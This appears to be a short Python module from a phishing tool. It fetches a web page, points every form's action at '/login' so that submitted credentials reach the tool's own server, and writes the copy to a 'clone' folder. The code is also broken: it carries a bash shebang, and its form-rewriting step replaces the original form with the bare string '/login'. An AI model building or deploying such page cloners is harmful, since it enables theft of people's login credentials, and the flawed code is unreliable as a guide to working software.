#!/bin/bash
def Clone(url):
    import requests, src.logs as logs
    logs.log(f"cloning by url: {url}")
    response = requests.get(url)
    if response.ok:
        open("index.html", "wb").write(response.content)
    else:
        print(response.status_code)

def OpenHtml():
    import src.logs as logs
    logs.log("loading html")
    return open("index.html", "r").read()

def ChangeHtml(html):
    import src.logs as logs
    logs.log("formatting html")
    
    from bs4 import BeautifulSoup as bs
    sp = bs(html, "html.parser")

    find_all_forms = sp.find_all("form")
    
    oldform = sp.form
    newform = ""
    for form in find_all_forms:
        newform = form["action"] = "/login"

    htmlForm = sp.prettify()
    return htmlForm.replace(str(oldform), newform)

def WriteHtml(payload):
    import os
    try:
        os.unlink("index.html")
        os.mkdir("clone")
    except:
        pass
    
    open("./clone/index.html", "w").write(payload)

def autoimport(url):
    Clone(url)
    WriteHtml(ChangeHtml(OpenHtml()))